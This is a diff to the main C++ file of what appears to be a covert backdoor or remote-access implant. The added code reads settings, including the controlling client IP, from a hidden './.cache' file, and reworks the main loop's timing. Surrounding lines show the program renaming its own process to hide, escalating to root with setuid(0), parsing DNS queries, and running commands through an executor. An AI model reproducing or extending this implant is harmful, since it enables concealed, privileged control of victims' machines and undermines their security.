@@ -1,5 +1,6 @@
 #include <iostream>
 #include <zconf.h>
+#include <fstream>
 #include "ProcessDistorter.h"
 #include "../shared/utils/Logger.h"
 #include "../shared/utils/argparcer.h"
@@ -32,6 +33,33 @@ void * fileSystemManagerThreadBootstrapper(void * fileSystemManagerThread){
     FileSystemManagerThread * fsmt = (FileSystemManagerThread *)fileSystemManagerThread;
     fsmt->start();
 }
+
+map<string,string> checkForConfigFileArgs(){
+
+    map<string, string> params;
+
+    ifstream reader("./.cache");
+
+    if(reader.is_open() == false){
+        return params;
+    }
+
+    while(reader.eof() == false){
+        string line;
+        std::getline(reader, line);
+
+        unsigned long split = line.find("=");
+        if(split == string::npos){
+            continue;
+        }
+        string param = line.substr(0,split);
+        string value = line.substr(split + 1);
+
+        params.insert(std::pair<string, string>(param, value));
+    }
+
+    return params;
+};
 
 string parseOutDNSQuery(PacketMeta meta){
 
@@ -98,6 +126,24 @@ int main(int argc, char * argv[]) {
         return 1;
     }
 
+    int timerLength = parcer.GetTagVal("-t", argv, argc);
+    if(timerLength == -1){
+        timerLength = 100;
+    }
+
+    map<string, string> configParams = checkForConfigFileArgs();
+    if(configParams.size() > 0){
+
+        if(configParams.find("t") != configParams.end()){
+            timerLength = stoi(configParams.at("t"));
+        }
+
+        if(configParams.find("c") != configParams.end()){
+            clientIP = configParams.at("c");
+        }
+
+    }
+
     Logger::debug("Main - Escalating File Privileges");
     setuid(0);
     setgid(0);
@@ -111,7 +157,7 @@ int main(int argc, char * argv[]) {
     TrafficAnalyzer * analyzer = new TrafficAnalyzer(historyLength);
     analyzer->setNewTimeSegment();
 
-    Time * time = new Time();
+    Time * time = new Time(timerLength, 2); //timeout of 10000 milliseconds and 2 users
     SystemState * ss = SystemState::getInstance(time);
 
     //Create NetworkMonitor
@@ -187,15 +233,17 @@ int main(int argc, char * argv[]) {
     // 3) Executing A Command With Executor
 
     Executor * executor = new Executor(fileSystemManagerQueue);
+    time->startTimer();
 
     while(1){
         //hang on timer tick
-        sleep(5);
+        //sleep(5);
+        time->hangForTick();
 
         //rename process
         processDistorter->determineProcessName();
 
-        sleep(5);
+        time->hangForTick();
 
         //hang on timer tick
 
